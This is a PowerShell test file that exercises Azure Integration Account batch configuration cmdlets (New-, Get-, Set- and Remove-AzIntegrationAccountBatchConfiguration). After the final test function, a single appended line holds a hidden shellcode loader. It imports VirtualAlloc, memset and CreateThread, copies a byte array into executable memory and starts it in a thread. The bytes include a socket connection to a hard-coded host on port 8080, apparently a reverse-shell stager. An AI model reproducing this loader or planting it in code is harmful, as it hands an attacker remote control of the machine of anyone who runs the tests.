














function Test-NewIntegrationAccountBatchConfiguration
{
	$batchConfigurationFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleBatchConfiguration.json"
	$batchConfigurationContent = [IO.File]::ReadAllText($batchConfigurationFilePath)
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName
	$sampleMetadata = (SampleMetadata)

	$batchConfigurationName = "BCJson"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationDefinition $batchConfigurationContent
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$batchConfigurationName = "BCJsonParObj"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ParentObject $integrationAccount -BatchConfigurationName $batchConfigurationName -BatchConfigurationDefinition $batchConfigurationContent
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$batchConfigurationName = "BCJsonId"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ParentResourceId $integrationAccount.Id -BatchConfigurationName $batchConfigurationName -BatchConfigurationDefinition $batchConfigurationContent
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$batchConfigurationName = "BCFilePath"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$batchConfigurationName = "BCFilePathParObj"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ParentObject $integrationAccount -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$batchConfigurationName = "BCFilePathId"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ParentResourceId $integrationAccount.Id -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$batchConfigurationName = "BCParameters"
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -MessageCount 199 -BatchSize 5 -ScheduleInterval 1 -ScheduleFrequency "Month"
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name
	Assert-AreEqual 199 $integrationAccountBatchConfiguration.Properties.ReleaseCriteria.MessageCount
	Assert-AreEqual 5 $integrationAccountBatchConfiguration.Properties.ReleaseCriteria.BatchSize
	Assert-AreEqual 1 $integrationAccountBatchConfiguration.Properties.ReleaseCriteria.Recurrence.Interval
	Assert-AreEqual "Month" $integrationAccountBatchConfiguration.Properties.ReleaseCriteria.Recurrence.Frequency

	$batchConfigurationName = "BCMetadata"
	$batchConfigurationMetadata =  New-AzIntegrationAccountBatchConfiguration -ParentResourceId $integrationAccount.Id -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath -Metadata $sampleMetadata
	Assert-AreEqual $batchConfigurationName $batchConfigurationMetadata.Name
	Assert-AreEqual $sampleMetadata["key1"] $batchConfigurationMetadata.Properties.Metadata["key1"].Value

	$batchConfigurationName = "BCNoParameters"
	Assert-ThrowsContains { New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName } "At least one release criteria must be provided."

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}


function Test-GetIntegrationAccountBatchConfiguration
{
	$batchConfigurationFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleBatchConfiguration.json"
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName
	$sampleMetadata = (SampleMetadata)

	$batchConfigurationName = "BC" + (getAssetname)
	$integrationAccountBatchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath -Metadata $sampleMetadata
	Assert-AreEqual $batchConfigurationName $integrationAccountBatchConfiguration.Name

	$resultByName = Get-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $integrationAccountBatchConfiguration.Name
	Assert-AreEqual $batchConfigurationName $resultByName.Name
	Assert-AreEqual $sampleMetadata["key1"] $resultByName.Properties.Metadata["key1"].Value

	$resultByResourceId = Get-AzIntegrationAccountBatchConfiguration -ParentResourceId $integrationAccount.Id -BatchConfigurationName $batchConfigurationName
	Assert-AreEqual $batchConfigurationName $resultByResourceId.Name

	$resultByResourceId = Get-AzIntegrationAccountBatchConfiguration -ParentResourceId $integrationAccount.Id
	Assert-AreEqual 1 $resultByResourceId.Count

	$resultByInputObject = Get-AzIntegrationAccountBatchConfiguration -ParentObject $integrationAccount -BatchConfigurationName $batchConfigurationName
	Assert-AreEqual $batchConfigurationName $resultByInputObject.Name

	$resultByPipingInputObject = $integrationAccount | Get-AzIntegrationAccountBatchConfiguration -BatchConfigurationName $batchConfigurationName
	Assert-AreEqual $batchConfigurationName $resultByPipingInputObject.Name

	$resultByInputObject = Get-AzIntegrationAccountBatchConfiguration -ParentObject $integrationAccount
	Assert-AreEqual 1 $resultByInputObject.Count

	$resultByPipingInputObject = $integrationAccount | Get-AzIntegrationAccountBatchConfiguration
	Assert-AreEqual 1 $resultByPipingInputObject.Count

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}


function Test-RemoveIntegrationAccountBatchConfiguration
{
	$batchConfigurationFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleBatchConfiguration.json"
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName

	$batchConfigurationName = "BC" + (getAssetname)	
	$batchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Remove-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName

	$batchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Remove-AzIntegrationAccountBatchConfiguration -ResourceId $batchConfiguration.Id

	$batchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Remove-AzIntegrationAccountBatchConfiguration -InputObject $batchConfiguration

	$batchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Remove-AzIntegrationAccountBatchConfiguration  -InputObject $batchConfiguration

	$batchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	$batchConfiguration | Remove-AzIntegrationAccountBatchConfiguration

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
}


function Test-SetIntegrationAccountBatchConfiguration
{
	$batchConfigurationFilePath = Join-Path (Join-Path $TestOutputRoot "Resources") "SampleBatchConfiguration.json"
	$batchConfigurationContent = [IO.File]::ReadAllText($batchConfigurationFilePath)
	$resourceGroup = TestSetup-CreateResourceGroup
	$integrationAccountName = "IA-" + (getAssetname)
	$integrationAccount = TestSetup-CreateIntegrationAccount $resourceGroup.ResourceGroupName $integrationAccountName

	$batchConfigurationName = "OriginalBC"
	$batchConfiguration =  New-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationDefinition $batchConfigurationContent
	Assert-AreEqual $batchConfigurationName $batchConfiguration.Name

	$edittedBatchConfiguration =  Set-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationDefinition $batchConfigurationContent
	Assert-AreEqual $batchConfigurationName $edittedBatchConfiguration.Name

	$edittedBatchConfiguration =  Set-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -BatchConfigurationFilePath $batchConfigurationFilePath
	Assert-AreEqual $batchConfigurationName $edittedBatchConfiguration.Name

	$edittedBatchConfiguration =  Set-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName -MessageCount 199 -BatchSize 5 -ScheduleInterval 1 -ScheduleFrequency "Month"
	Assert-AreEqual $batchConfigurationName $edittedBatchConfiguration.Name
	Assert-AreEqual 199 $edittedBatchConfiguration.Properties.ReleaseCriteria.MessageCount
	Assert-AreEqual 5 $edittedBatchConfiguration.Properties.ReleaseCriteria.BatchSize
	Assert-AreEqual 1 $edittedBatchConfiguration.Properties.ReleaseCriteria.Recurrence.Interval
	Assert-AreEqual "Month" $edittedBatchConfiguration.Properties.ReleaseCriteria.Recurrence.Frequency

	Assert-ThrowsContains { Set-AzIntegrationAccountBatchConfiguration -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -BatchConfigurationName $batchConfigurationName } "At least one release criteria must be provided."

	Remove-AzIntegrationAccount -ResourceGroupName $resourceGroup.ResourceGroupName -IntegrationAccountName $integrationAccountName -Force
} 
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x29,0x8d,0x04,0x52,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

